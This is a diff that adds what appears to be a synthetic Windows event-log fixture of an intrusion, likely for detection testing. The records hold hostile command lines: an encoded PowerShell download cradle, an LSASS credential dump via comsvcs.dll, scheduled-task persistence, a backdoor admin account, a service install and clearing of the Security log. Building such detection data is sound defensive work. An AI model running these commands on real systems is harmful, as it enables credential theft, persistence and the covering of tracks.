@@ -1,0 +1,11 @@
+{"timestamp": "2026-10-22T09:10:01Z", "source_type": "evtx", "EventID": 4625, "User": "Administrator", "SourceIP": "192.168.50.112", "Process": "winlogon.exe", "CommandLine": "LogonType=3"}
+{"timestamp": "2026-10-22T09:10:04Z", "source_type": "evtx", "EventID": 4625, "User": "Administrator", "SourceIP": "192.168.50.112", "Process": "winlogon.exe", "CommandLine": "LogonType=3"}
+{"timestamp": "2026-10-22T09:11:15Z", "source_type": "evtx", "EventID": 4624, "User": "CORP\\backup_svc", "SourceIP": "192.168.50.112", "Process": "svchost.exe", "CommandLine": "LogonType=10"}
+{"timestamp": "2026-10-22T09:12:30Z", "source_type": "evtx", "EventID": 4688, "User": "CORP\\backup_svc", "SourceIP": "10.0.2.15", "Process": "cmd.exe", "CommandLine": "cmd.exe /c whoami /all"}
+{"timestamp": "2026-10-22T09:13:05Z", "source_type": "evtx", "EventID": 4688, "User": "CORP\\backup_svc", "SourceIP": "10.0.2.15", "Process": "powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"}
+{"timestamp": "2026-10-22T09:14:22Z", "source_type": "evtx", "EventID": 4688, "User": "SYSTEM", "SourceIP": "10.0.2.15", "Process": "rundll32.exe", "CommandLine": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\temp\\lsass.dmp full"}
+{"timestamp": "2026-10-22T09:15:40Z", "source_type": "evtx", "EventID": 4688, "User": "SYSTEM", "SourceIP": "10.0.2.15", "Process": "schtasks.exe", "CommandLine": "schtasks /create /tn SystemHealthCheck /tr C:\\Users\\Public\\beacon.exe /sc minute /mo 15"}
+{"timestamp": "2026-10-22T09:16:12Z", "source_type": "evtx", "EventID": 4720, "User": "SYSTEM", "SourceIP": "10.0.2.15", "Process": "lsass.exe", "CommandLine": "net user support_admin P@ssw0rd123! /add"}
+{"timestamp": "2026-10-22T09:17:00Z", "source_type": "evtx", "EventID": 7045, "User": "SYSTEM", "SourceIP": "10.0.2.15", "Process": "services.exe", "CommandLine": "C:\\ProgramData\\UpdaterSvc.exe"}
+{"timestamp": "2026-10-22T09:18:55Z", "source_type": "evtx", "EventID": 1102, "User": "CORP\\backup_svc", "SourceIP": "10.0.2.15", "Process": "wevtutil.exe", "CommandLine": "wevtutil cl Security"}
+
